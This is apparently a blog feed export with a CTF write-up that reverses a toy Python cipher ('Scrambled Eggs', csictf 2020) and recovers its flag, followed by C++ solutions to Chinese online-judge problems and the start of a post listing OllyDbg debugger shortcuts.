<p>In this <strong>reversing</strong>/<strong>crypto</strong> challenge, we are provided with two files : [scrambledeggs.txt](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/scrambledeggs.txt) which contains two encrypted keys and the encrypted flag, and [scrambledeggs.py](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/scrambledeggs.py) the python script that was used to encrypt the flag.</p>
<p><strong>scrambledeggs.txt</strong> :</p>
<pre><code>Encrytped key1 = xtfsyhhlizoiyx                                                                                                                  
Encrypted key2 = eudlqgluduggdluqmocgyukhbqkx                                                                                                    
Encrypted flag = lvvrafwgtocdrdzfdqotiwvrcqnd
</code></pre>
<p><strong>scrambledeggs.py</strong> :</p>
<pre><code class="language-python">import random 
import sys

map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']

flag = 'csictf{this_is_a_fake_flag}'
flag = flag.replace('{','a')
flag = flag.replace('}','a')
flag = flag.replace('_','b')
key1 = 'ashikka_is_mine'
key1 = key1.replace('_','b')

if(len(flag) != 28 or len(key1) != 14):
    exit()
    
flag = list(flag)
key1 = list(key1)


def enc1(text):
    n = random.randint(0,sys.maxsize%28)
    return text[n:] + text[:n]
    
flag = enc1(flag)
    
def enc2(text):
    temp = ''
    for i in text:
        temp += map[ord(i)-ord('a')]
    return temp

key2 = enc2(enc2(key1))
key2 = list(key2)

for j in range(2):
    for i in range(14):
        temp1 = flag[i]
        flag[i] = flag[(ord(key1[i])-ord('a'))%28] 
        flag[(ord(key1[i])-ord('a'))%28] = temp1
        temp2 = key1[i]
        key1[i] = key1[(ord(key2[i])-ord('a'))%14] 
        key1[(ord(key2[i])-ord('a'))%14] = temp2
        
        
    for i in range(14,28):
        temp1 = flag[i]
        flag[i] = flag[(ord(key2[i-14])-ord('a'))%28] 
        flag[(ord(key2[i-14])-ord('a'))%28] = temp1
        temp2 = key2[i-14]
        key2[i-14] = key2[(ord(key1[i-14])-ord('a'))%14] 
        key2[(ord(key1[i-14])-ord('a'))%14] = temp2
        

l = random.sample([key1, key2], 2)
key1 = l[0]
key2 = l[1]

k = ''
for i in range(14):
    k += random.choice(map)
k = list(k)

key2 = k+key2
for i in range(14):
    a = ord(k[i])-ord('a')+ord(key2[i+14])
    if a&gt;122:
        a=a%122
        a=a+97
    key2[i+14]= chr(a)

flag = ''.join(flag)
key1 = ''.join(key1)
key2 = ''.join(key2)
 
key2 = enc2(key2)
flag= enc1(enc1(enc1(enc2(flag))))

print('Encrytped key1 = '+key1)
print('Encrypted key2 = '+key2)
print('Encrypted flag = '+flag)
</code></pre>
<h2 id="approach-to-the-solution">Approach to the solution</h2>
<h3 id="understanding-the-script">Understanding the script</h3>
<p>After calmly reading and trying to understand the script above, we can summarize its steps as the following points :</p>
<ul>
<li>we start off with the assignment of <code>flag</code> and <code>key1</code> (which both are not the actual ones obviously)</li>
</ul>
<pre><code class="language-python">flag = 'csictf{this_is_a_fake_flag}'
flag = flag.replace('{','a')
flag = flag.replace('}','a')
flag = flag.replace('_','b')
key1 = 'ashikka_is_mine'
key1 = key1.replace('_','b')
</code></pre>
<ul>
<li><code>flag</code> is encrypted using the <code>enc1</code> function</li>
</ul>
<pre><code class="language-python">flag = enc1(flag)
</code></pre>
<ul>
<li><code>key2</code> is assigned as the double encryption of <code>key1</code> using the <code>enc2</code> function</li>
</ul>
<pre><code class="language-python">key2 = enc2(enc2(key1))
</code></pre>
<ul>
<li>then comes the big double loop, which simply makes a few swaps between the characters of <code>flag</code>, <code>key1</code> and <code>key2</code></li>
</ul>
<pre><code class="language-python">for j in range(2):
    for i in range(14):
        temp1 = flag[i]
        flag[i] = flag[(ord(key1[i])-ord('a'))%28] 
        flag[(ord(key1[i])-ord('a'))%28] = temp1
        temp2 = key1[i]
        key1[i] = key1[(ord(key2[i])-ord('a'))%14] 
        key1[(ord(key2[i])-ord('a'))%14] = temp2
        
        
    for i in range(14,28):
        temp1 = flag[i]
        flag[i] = flag[(ord(key2[i-14])-ord('a'))%28] 
        flag[(ord(key2[i-14])-ord('a'))%28] = temp1
        temp2 = key2[i-14]
        key2[i-14] = key2[(ord(key1[i-14])-ord('a'))%14] 
        key2[(ord(key1[i-14])-ord('a'))%14] = temp2
</code></pre>
<ul>
<li>after that, there is a possibility that <code>key1</code> and <code>key2</code> are swapped</li>
</ul>
<pre><code class="language-python">l = random.sample([key1, key2], 2)
key1 = l[0]
key2 = l[1]
</code></pre>
<ul>
<li>random characters are appended to <code>key2</code>, and using those characters <code>key2</code>'s characters are modified</li>
</ul>
<pre><code class="language-python">k = ''
for i in range(14):
    k += random.choice(map)
k = list(k)

key2 = k+key2
for i in range(14):
    a = ord(k[i])-ord('a')+ord(key2[i+14])
    if a&gt;122:
        a=a%122
        a=a+97
    key2[i+14]= chr(a)
</code></pre>
<ul>
<li><code>key2</code> is encrypted using the <code>enc2</code> function</li>
</ul>
<pre><code class="language-python">key2 = enc2(key2)
</code></pre>
<ul>
<li><code>flag</code> is encrypted using the <code>enc2</code> function, and then encrypted three times using the <code>enc1</code> function</li>
</ul>
<pre><code class="language-python">flag= enc1(enc1(enc1(enc2(flag))))
</code></pre>
<ul>
<li>finally <code>key1</code>, <code>key2</code> and <code>flag</code> are printed</li>
</ul>
<pre><code class="language-python">print('Encrytped key1 = '+key1)
print('Encrypted key2 = '+key2)
print('Encrypted flag = '+flag)
</code></pre>
<h3 id="how-to-approach-this">How to approach this ?</h3>
<p>The general approach to take for this type of challenges is to first start by identifying and dividing the big individual problems/steps and come up with solutions for them if possible, then we procede to reverse each step starting from the bottom heading to the top, and we have to make sure to mark the steps where different values could come up, in our case, these are the steps where random values are used. Since we cannot guess those values, we use brute force by computing all the possible combinations.</p>
<p>So first, let's start by identifying the steps where brute force is needed and where not :</p>
<ul>
<li>the <code>enc1</code> function uses random values to determine where to split the <code>text</code> argument, that means brute force is required</li>
</ul>
<pre><code class="language-python">def enc1(text):
    n = random.randint(0,sys.maxsize%28)
    return text[n:] + text[:n]
</code></pre>
<ul>
<li>the <code>enc2</code> function simply maps characters from <code>text</code> to the <code>map</code> defined at the top of the script, so we can &quot;undo&quot; that</li>
</ul>
<pre><code class="language-python">map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']
def enc2(text):
    temp = ''
    for i in text:
        temp += map[ord(i)-ord('a')]
    return temp
</code></pre>
<ul>
<li>the big double loop looks daunting but it is easily reversible by litteraly reversing the steps</li>
<li>the key swapping is out of our control, we have to consider the two cases where <code>key1</code> and <code>key2</code> are swapped and when they are not</li>
<li>the part where random characters are mixed with <code>key2</code> aspires that we need to use brute force, but we will find out later that we can actually recover <code>key2</code> without using brute force</li>
</ul>
<h2 id="crafting-the-solution">Crafting the solution</h2>
<p>Now that we have identified the major steps of the encryption and the steps that require brute force, we can begin writing the solution. We will start off by writing some functions that will help us reverse some steps.</p>
<h3 id="reversing-enc1">reversing <code>enc1</code></h3>
<p>The <code>enc1</code> function generates first a random number <code>n</code> using <code>random.randint(0, sys.maxsize%28)</code>, <code>sys.maxsize</code> refers to the platform's pointer size, for 64-bit machines that's <code>2**63-1</code>, therefore, if we assume that the machine used to run the script is 64-bit <code>sys.maxsize%28</code> evaluates to <code>7</code>.</p>
<p>Since we can't guess the random numbers generated, we will simply define the reverse function <code>dec1</code> to take two arguments <code>text</code> and <code>n</code> :</p>
<pre><code class="language-python">def dec1(text, n):
    assert(0 &lt;= n &lt; 28)
    return text[-n:] + text[:-n]
</code></pre>
<p>Then in our main function, we will make sure to generate all the possible values for <code>n</code> (0 to 7)</p>
<h3 id="reversing-enc2">reversing <code>enc2</code></h3>
<p>On the other hand <code>enc2</code> is easily reversible by remapping the characters of <code>text</code> like this :</p>
<pre><code class="language-python">def dec2(text):
    # map each character of text to the character of order :
    # index of text[i] in scramble_map + ord('a')
    return ''.join(chr(scramble_map.index(char) + ord('a')) for char in text)
</code></pre>
<h3 id="unlooping">unlooping</h3>
<p>As stated before, we reverse the big double loop by simply reversing the steps, just like this :</p>
<pre><code class="language-python">def unloop(key1, key2, flag):
    key1, key2, flag = list(key1), list(key2), list(flag)
    assert (len(key1) == len(key2) == 14)
    for j in range(2):
        # we make sure the range is from 27 to 14, not 14 to 27
        for i in range(27, 13, -1):
            # taking advantage of python's built-in way to swap values
            # rather than using a temp variable
            index = (ord(key1[i-14]) - ord('a')) % 14
            key2[index], key2[i-14] = key2[i-14], key2[index]

            index = (ord(key2[i-14]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

        for i in range(13, -1, -1):
            index = (ord(key2[i]) - ord('a')) % 14
            key1[index], key1[i] = key1[i], key1[index]

            index = (ord(key1[i]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

    return ''.join(key1), ''.join(key2), ''.join(flag)
</code></pre>
<h3 id="recovering-key2">recovering <code>key2</code></h3>
<p>We said before that the part where 14 random characters were mixed up with <code>key2</code> is reversible without brute force, that's because those random chars are appended to <code>key2</code> and not scrambled afterwards, so here are the steps to recover <code>key2</code> :</p>
<pre><code class="language-python">def recover_key2(ekey2):
    assert(len(ekey2) == 28)
    # the random characters are the 14 first
    k = ekey2[:14]
    # the list of `a`s
    alist = list(map(ord, ekey2[14:]))
    res = ''
    for i in range(14):
        # we simply compute c using linear equations
        c = alist[i] - ord(k[i]) + ord('a')
        # since all characters are ascii lowercase
        # this check helps avoiding multiple potential values
        if not ord('a') &lt;= c &lt;= ord('z'):
            c += 122 - 97
        res += chr(c)
    return res
</code></pre>
<h3 id="wrapping-everything-up">Wrapping everything up</h3>
<p>In order to join everything we have been working on, we simply reverse the steps of the total encryption from bottom to top :</p>
<ol>
<li>Generate combinations of three <code>n</code>s (from 0 to 7)</li>
</ol>
<pre><code class="language-python">randsize = 7
combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
</code></pre>
<ol>
<li>Use the combinations to call <code>dec1</code> three times on the encrypted flag, and then call <code>dec2</code> (we can call <code>dec2</code> first since <code>dec1</code> doesn't change the characters of <code>text</code>)</li>
</ol>
<pre><code class="language-python">flag = dec2(eflag)
for c in combinations:
    flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
</code></pre>
<ol>
<li>Call <code>dec2</code> on the encrypted <code>key2</code></li>
</ol>
<pre><code class="language-python">key2 = dec2(ekey2)
</code></pre>
<ol>
<li>Recover <code>key2</code> using <code>recover_key2</code></li>
</ol>
<pre><code class="language-python">key2 = recover_key2(key2)
</code></pre>
<ol>
<li>Choose whether to swap <code>key1</code> and <code>key2</code> or not</li>
</ol>
<pre><code class="language-python">swapkeys = True
if swapkeys: key1, key2 = key2, key1
</code></pre>
<ol>
<li>Undo the big double loop using <code>unloop</code></li>
</ol>
<pre><code class="language-python">key1, key2, flag = unloop(key1, key2, flag)
</code></pre>
<ol>
<li>Since originally, before the loop, <code>key2</code> is equal to <code>enc2(enc2(key1))</code> we can check whether that is true to minimize the results</li>
</ol>
<pre><code class="language-python">if dec2(dec2(key2)) == key1:
</code></pre>
<ol>
<li>Once again we generate <code>n</code>s to decrypt <code>flag</code> with <code>dec1</code></li>
</ol>
<pre><code class="language-python">for n in range(randsize + 1):
    flag = dec1(flag, n)
    results.append(flag)
</code></pre>
<ol>
<li>Finally, we can store all the resulting flags in a file named &quot;results.txt&quot;, so that we can check out if it contains the actual correct flag</li>
</ol>
<pre><code class="language-python">outfile = 'results.txt'
with open(outfile, 'w') as f:
    f.write('\n'.join(results))
    f.close()
</code></pre>
<p><strong>Note</strong> : steps 3, 4 and 5 can be done before generating the combinations since those combinations affect only <code>flag</code></p>
<h3 id="the-main-function">The main function</h3>
<pre><code class="language-python">combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
key1 = ekey1
key2 = recover_key2(dec2(ekey2))
flag = dec2(eflag)
if swapkeys: key1, key2 = key2, key1
original = flag, key1, key2
results = []
for c in combinations:
    flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
    key1, key2, flag = unloop(key1, key2, flag)
    if dec2(dec2(key2)) == key1:
        for n in range(randsize + 1):
            flag = dec1(flag, n)
            results.append(flag)
    flag, key1, key2 = original
with open(outfile, 'w') as f:
    f.write('\n'.join(results))
    f.close()
</code></pre>
<p>The full script is [here](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/solve.py)</p>
<h2 id="unscrambled-eggs">Unscrambled Eggs</h2>
<p>On the first try, when <code>swapkeys</code> is set to <code>False</code>, &quot;results.txt&quot; turns out to be empty. But then after setting that to <code>True</code>, the file is quite populated, that could mean that we've been successful.</p>
<p><code>grep &quot;^csictf&quot; results.txt</code> :</p>
<figure data-type="image" tabindex="1"><img src="https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf%202020-Scrambled%20Eggs/img/grep1.png" alt="grep &quot;^csictf&quot; results.txt" loading="lazy"></figure>
<p>Hmmm.. we get nothing</p>
<p><code>grep &quot;csictf&quot; results.txt</code> :</p>
<figure data-type="image" tabindex="2"><img src="https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf%202020-Scrambled%20Eggs/img/grep2.png" alt="grep &quot;csictf&quot; results.txt" loading="lazy"></figure>
<p>Ah ! we get some results now, if we replace some <code>a</code>s and <code>b</code>s to <code>{</code>, <code>}</code> and <code>_</code> in <code>sacsictfaallbthebkingsbhorse</code> we can read <code>s}csictf{all_the_kings_horse</code>.</p>
<p>It is trivial now that the <strong>flag</strong> is :</p>
<pre><code>csictf{all_the_kings_horses}
</code></pre>
<h2 id="the-full-script">The full script</h2>
<pre><code>#!/usr/bin/env python3
import itertools

# encrypted key1, key2 and flag (from scrambledeggs.txt)
ekey1 = 'xtfsyhhlizoiyx'
ekey2 = 'eudlqgluduggdluqmocgyukhbqkx'
eflag = 'lvvrafwgtocdrdzfdqotiwvrcqnd'

scramble_map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']
# result of the evaluation of (sys.maxsize % 28) for 64-bit machines
randsize = 7
# to choose whether or not to swap key1 and key2
swapkeys = True
# write the resulting flag combinations to a file
outfile = 'results.txt'

# reverse enc1, but provide n
def dec1(text, n):
    assert(0 &lt;= n &lt; 28)
    return text[-n:] + text[:-n]

# reverse enc2
def dec2(text):
    # map each character of text to the character of order :
    # index of text[i] in scramble_map + ord('a')
    return ''.join(chr(scramble_map.index(char) + ord('a')) for char in text)

# recover key2 from the encrypted key2 (the part where random chars are appended to key2)
def recover_key2(ekey2):
    assert(len(ekey2) == 28)
    # the random characters are the 14 first
    k = ekey2[:14]
    # the list of `a`s
    alist = list(map(ord, ekey2[14:]))
    res = ''
    for i in range(14):
        # we simply compute c using linear equations
        c = alist[i] - ord(k[i]) + ord('a')
        # since all characters are ascii lowercase
        # this check helps avoiding multiple potential values
        if not ord('a') &lt;= c &lt;= ord('z'):
            c += 122 - 97
        res += chr(c)
    return res

# undo the big double loop
def unloop(key1, key2, flag):
    key1, key2, flag = list(key1), list(key2), list(flag)
    assert (len(key1) == len(key2) == 14)
    for j in range(2):
        # we make sure the range is from 27 to 14, not 14 to 27
        for i in range(27, 13, -1):
            # taking advantage of python's built-in way to swap values
            # rather than using a temp variable
            index = (ord(key1[i-14]) - ord('a')) % 14
            key2[index], key2[i-14] = key2[i-14], key2[index]

            index = (ord(key2[i-14]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

        for i in range(13, -1, -1):
            index = (ord(key2[i]) - ord('a')) % 14
            key1[index], key1[i] = key1[i], key1[index]

            index = (ord(key1[i]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

    return ''.join(key1), ''.join(key2), ''.join(flag)

if __name__ == '__main__':
    # generate the combinations of 3 `n`s using itertools.product
    combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
    key1 = ekey1
    key2 = recover_key2(dec2(ekey2))
    flag = dec2(eflag)
    if swapkeys: key1, key2 = key2, key1
    original = flag, key1, key2
    results = []
    for c in combinations:
        flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
        key1, key2, flag = unloop(key1, key2, flag)
        if dec2(dec2(key2)) == key1:
            for n in range(randsize + 1):
                flag = dec1(flag, n)
                results.append(flag)
        flag, key1, key2 = original
    with open(outfile, 'w') as f:
        f.write('\n'.join(results))
        f.close()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMTOJ部分题解(更新中)]]></title>
        <id>https://7usai.github.io/post/cumtoj-bu-fen-ti-jie-geng-xin-zhong/</id>
        <link href="https://7usai.github.io/post/cumtoj-bu-fen-ti-jie-geng-xin-zhong/">
        </link>
        <updated>2020-09-08T15:09:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="大白just大白">大白just大白</h2>
<h3 id="题目描述">题目描述</h3>
<p>大家都知道，大白对学术要求是很严格的。抄作业、考试作弊神马的在大白这简直不能忍。</p>
<p>这不刚刚过去的期末考试。有n个学生被查出来有问题。</p>
<p>大白给了他们申辩的机会，每个学生可以提交一段文字，作为申辩理由。但是大白发现来的人总会有一些奇怪的理由。</p>
<p>大白提前列了m个常见借口关键字。他想看看来申辩的学生中最烂的申辩理由是什么。</p>
<p>所谓最烂申辩理由就是，申辩里，含有常见借口关键字最多的。</p>
<p>含有关键字，指的是，理由中出现了一串和关键字完全匹配的字符串，如果出现大写小写不同，也认为匹配。比如，关键字是 bed 理由中出现Bedroom算含有一个关键字。</p>
<h3 id="输入">输入</h3>
<p>一个输入可能有多个case，每个case第一行两个数。分别代表n 和 m</p>
<p>接下来m行，每行一个关键字（字符串）</p>
<p>再接下来n行字符串。m和n都不大于20</p>
<p>每一个借口和借口关键字只会包含大小写字母，长度不会超过4000个字符。</p>
<h3 id="输出">输出</h3>
<p>对于每个case输出一行字符串，表示最烂的理由。若有多个理由包含相同数目的关键字，按输入顺序输出靠前的那个。</p>
<h3 id="样例输入">样例输入</h3>
<pre><code>2 3
love
cumt
ACM
ILoveCUMTACM
cumtAACM
2 2
A
b
Ab
bA
</code></pre>
<h3 id="样例输出">样例输出</h3>
<pre><code>ILoveCUMTACM
Ab
</code></pre>
<h3 id="代码">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;string&gt;
using namespace std;
int main()
{
	int max= 21;
    int n,m,i,j;
    string nn[max],mm[max];
    string nn2[max],mm2[max];
    while(cin&gt;&gt;n&gt;&gt;m)
    {
   		for(int i=0;i&lt;m;i++)
		{
			cin&gt;&gt;mm[i];
			mm2[i]=mm[i];
			for(int j = 0; mm[i][j] != '\0'; j++)
            {
                mm[i][j] = tolower(mm[i][j]);
            }
            //cout&lt;&lt;mm[i]&lt;&lt;mm2[i]; 
		}
		for(int i=0;i&lt;n;i++)
		{
			cin&gt;&gt;nn[i];
			nn2[i]=nn[i];
			for(int j = 0; nn[i][j] != '\0'; j++)
            {
                nn[i][j] = tolower(nn[i][j]);
            }
            //cout&lt;&lt;nn[i];
		}
        int p=-1,q=-1,k;
        for(i = 0; i &lt; n; i++)
        {
            k= 0;
            for(j = 0; j &lt; m; j++)
            {
                string::size_type temp = nn[i].find(mm[j]);
                if(temp!=string::npos)
				k++;
            }
            if(k&gt;p)
            {
                p=k;
                q=i;
            }
        }
        cout&lt;&lt;nn2[q]&lt;&lt;endl;
    }
    return 0;
}
</code></pre>
<h2 id="小雏鸟的计算">小雏鸟的计算</h2>
<h3 id="题目描述-2">题目描述</h3>
<p>小雏鸟们的三角形翅膀终于长出健壮的肌肉和丰满的羽毛，已经跃跃欲试的去准备尝试挑战新的难题了。</p>
<p>考虑以下的算法：<br>
\1.     输入 n<br>
\2.     印出 n<br>
\3.     如果 n = 1 结束<br>
\4.     如果 n 是奇数 那么 n=3*n+1<br>
\5.     否则 n=n/2<br>
\6.     GOTO 2<br>
例如输入 22 得到的数列： 22 11 34 17 52 26 13 40 20 10 5 16 8 4 2 1<br>
据推测此算法对任何整数而言会终止 (当打印出 1 的时候)。虽然此算法很简单，但以上的推测是否真实却无法知道。然而对所有的n ( 0 &lt; n &lt; 1000000 )来说，以上的推测已经被验证是正确的。<br>
给一个输入 n 透过以上的算法我们可以得到一个数列（1作为结尾）。此数列的长度称为n的cycle length。上面提到的例子 22的 cycle length为 16.<br>
问题来了：对任2个整数i，j我们想要知道介于i，j（包含i，j）之间的数所产生的数列中最大的cycle length是多少。</p>
<h3 id="输入-2">输入</h3>
<p>输入可能包含了好几行测试数据，每一行有一对整数 i，j 。</p>
<p>0&lt; i，j &lt; 1000000</p>
<h3 id="输出-2">输出</h3>
<p>对每一对输入 i j你应该要输出 i j和介于i j之间的数所产生的数列中最大的cycle length。</p>
<h3 id="样例输入-2">样例输入</h3>
<pre><code>1 10
10 1
100 200
201 210
900 1000
</code></pre>
<h3 id="样例输出-2">样例输出</h3>
<pre><code>1 10 20
10 1 20
100 200 125
201 210 89
900 1000 174
</code></pre>
<h3 id="代码-2">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;stdio.h&gt;
using namespace std;
int a;
void f(int x)
{
    if(x == 1) 
	return;
    if(x % 2) 
	x = 3*x+1;
    else 
	x /= 2;
    f(x);
    a++;
}
int count(int x)
{
    a = 1;
    f(x);
    return a;
}
int main()
{
    int l,r,l2,r2,max_;
    while(cin&gt;&gt;l&gt;&gt;r)
    {
    	l2=l;
    	r2=r;
        if(l2 &gt; r2)
		swap(l2,r2);
        max_ = 0;
        for(int i = l2; i &lt;= r2; i++)
            max_ = max(max_,count(i));
        cout&lt;&lt;l&lt;&lt;' '&lt;&lt;r&lt;&lt;' '&lt;&lt;max_&lt;&lt;endl;
    }
    return 0;
}
</code></pre>
<h2 id="排列问题">排列问题</h2>
<h3 id="题目描述-3">题目描述</h3>
<p>输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。</p>
<h3 id="输入-3">输入</h3>
<p>单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。</p>
<h3 id="输出-3">输出</h3>
<p>打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。</p>
<h3 id="样例输入-3">样例输入</h3>
<pre><code>abc,
</code></pre>
<h3 id="样例输出-3">样例输出</h3>
<pre><code>abc acb bac bca cab cba
</code></pre>
<h3 id="代码-3">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;algorithm&gt;
using namespace std;
int main()
{
	string s;
	cin&gt;&gt;s;
	s=s.substr(0,s.length()-1);
	sort(s.begin(),s.end());
	cout&lt;&lt;s&lt;&lt;&quot; &quot;;
	while(next_permutation(s.begin(),s.end()))
	{
		cout&lt;&lt;s&lt;&lt;&quot; &quot;;
	}
	return 0;
}
</code></pre>
<h2 id="快速幂">快速幂</h2>
<h3 id="题目描述-4">题目描述</h3>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1599577873521.png" alt="" loading="lazy"></figure>
<h3 id="输入-4">输入</h3>
<p>多组测试样例，最多50组。每组测试样例给定一个整数x(1&lt;=x&lt;=25000)</p>
<h3 id="输出-4">输出</h3>
<p>对每个样例，输出一行，代表f(x)对100000007取余的结果。</p>
<h3 id="样例输入-4">样例输入</h3>
<pre><code>3
4
5
</code></pre>
<h3 id="样例输出-4">样例输出</h3>
<pre><code>33
289
3414
</code></pre>
<h3 id="代码-4">代码</h3>
<pre><code>#include&lt;iostream&gt;
using namespace std;
long long n=100000007;
long long poww(long long a, long long b)// return a ^ b
{
	long long ans = 1;
	while(b != 0)
	{
		if(b&amp;1 != 0) 
		ans = ans * a % n;
		a = a * a %n;
		b&gt;&gt;=1;
	}
return ans;
}
int main()
{
	int x;
	while(cin&gt;&gt;x)
	{
		long long y=0;
		for(int i=1;i&lt;=x;i++)
		y+=poww(i,i);
		cout&lt;&lt;(y+1)%n&lt;&lt;endl;
	}
	return 0;
} 
</code></pre>
<h2 id="求第k小">求第k小</h2>
<h3 id="题目描述-5">题目描述</h3>
<p>给定n(1&lt;=n&lt;=1000000)个元素，求第k小数(1&lt;=k&lt;=n)。</p>
<h3 id="输入-5">输入</h3>
<p>一组样例。第一行输入两个整数n和k。第二行输入n个不同的int范围内的数。</p>
<h3 id="输出-5">输出</h3>
<p>输出一行，输出第k小数。</p>
<h3 id="样例输入-5">样例输入</h3>
<pre><code>5 2
1 5 3 2 4
</code></pre>
<h3 id="样例输出-5">样例输出</h3>
<pre><code>2
</code></pre>
<h3 id="代码-5">代码</h3>
<pre><code>#include &lt;iostream&gt;
using namespace std;
int a[1000001];
void swap(int &amp;a, int &amp;b)
{
	int temp = a;
	a = b;
	b = temp;
}
int partition(int arr[], int left, int right)  //找基准数 划分
{
    int i = left + 1 ;
    int j = right;
    int temp = arr[left];
 
    while(i &lt;= j)
    {
        while (arr[i] &lt; temp)
        {
            i++;
        }
        while (arr[j] &gt; temp )
        {
            j--;
        }
        if (i &lt; j)
            swap(arr[i++], arr[j--]);
        else i++;
   }
    swap(arr[j], arr[left]);
    return j; 
}
void quicksort(int a[],int left,int right)
{
	if(left &lt; right)
	{
		int j= partition(a, left, right);
	    quicksort(a, left, j - 1);
		quicksort(a, j + 1, right);	
	}
}
int main()
{
	int n, k;
	cin &gt;&gt; n;
	cin &gt;&gt; k; 
	for(int i = 0; i &lt; n; i++)
		cin &gt;&gt; a[i];
	quicksort(a, 0, n-1);
	cout &lt;&lt; a[k - 1] &lt;&lt; endl;
	return 0;	
}
</code></pre>
<h2 id="沙子的质量dp题">沙子的质量(dp题)</h2>
<h3 id="题目描述-6">题目描述</h3>
<p>设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。</p>
<h3 id="输入-6">输入</h3>
<p>第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。</p>
<h3 id="输出-6">输出</h3>
<p>合并的最小代价。</p>
<h3 id="样例输入-6">样例输入</h3>
<pre><code>4
1 3 5 2
</code></pre>
<h3 id="样例输出-6">样例输出</h3>
<pre><code>22
</code></pre>
<h3 id="代码-6">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
using namespace std;
int main()
{
	int dp[300][300];
    int n,i,j,k,a[300],sum[300] = {0};
   	//cout&lt;&lt;sizeof(dp);
	memset(dp,1,sizeof(dp));
    cin&gt;&gt;n;
    for(i = 1; i &lt;= n; i++)
    {
        cin&gt;&gt;a[i];
        sum[i] = sum[i-1]+a[i];
        dp[i][i] = 0;
    }
    for(i = 2; i &lt;= n; i++)
    {
        for(j = i; j &gt;= 1; j--)
        {
            for(k = j; k &lt;= i; k++)
                dp[j][i] = min(dp[j][i],dp[j][k]+dp[k+1][i]+sum[i]-sum[j-1]);
        }
    }
    cout&lt;&lt;dp[1][n];
    return 0;
}
</code></pre>
<h2 id="最长公共子序列dp题">最长公共子序列(dp题)</h2>
<h3 id="题目描述-7">题目描述</h3>
<p>一个字符串A的子串被定义成从A中顺次选出若干个字符构成的串。如A=“cdaad&quot; ,顺次选1，3，5个字符就构成子串&quot; cad&quot; ,现给定两个字符串，求它们的最长共公子串。</p>
<h3 id="输入-7">输入</h3>
<p>第一行两个字符串用空格分开。两个串的长度均小于2000 。</p>
<h3 id="输出-7">输出</h3>
<p>最长子串的长度。</p>
<h3 id="样例输入-7">样例输入</h3>
<pre><code>abccd aecd
</code></pre>
<h3 id="样例输出-7">样例输出</h3>
<pre><code>3
</code></pre>
<h3 id="代码-7">代码</h3>
<pre><code>#include&lt;iostream&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
using namespace std;
int dp[2000][2000]; 
int main()
{
	int len1,len2,i,j;
    char a[2000],b[2000];
    cin&gt;&gt;a&gt;&gt;b;
    len1 = strlen(a);
	len2 = strlen(b);
    for( i = 1; i &lt;= len1; i++)
    {
        for( j = 1; j &lt;= len2; j++)
        {
            if(a[i-1] == b[j-1]) dp[i][j] = dp[i-1][j-1]+1;
            else dp[i][j] = max(dp[i-1][j],dp[i][j-1]);
        }
    }
    cout&lt;&lt;dp[len1][len2];
    return 0;
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RE学习]]></title>
        <id>https://7usai.github.io/post/re-xue-xi/</id>
        <link href="https://7usai.github.io/post/re-xue-xi/">
        </link>
        <updated>2020-09-02T11:44:09.000Z</updated>
        <content type="html"><![CDATA[<h1 id="逆向软件基础">逆向软件基础</h1>
<p>debug版本较大、带调试信息，release版本优化程序、程序更小</p>
<h2 id="od快捷键">OD快捷键</h2>
<pre><code>F2 下断点
F3 加载一个可执行程序
F4 程序执行到光标处
F5 缩小、还原当前窗口
F7 单步步入
F8 单步步过
F9 直接运行程序，遇到断点处，程序暂停
Ctrl + F2 重新运行程序到起始处
Ctrl + F9 执行到函数返回处，用于跳出函数实现
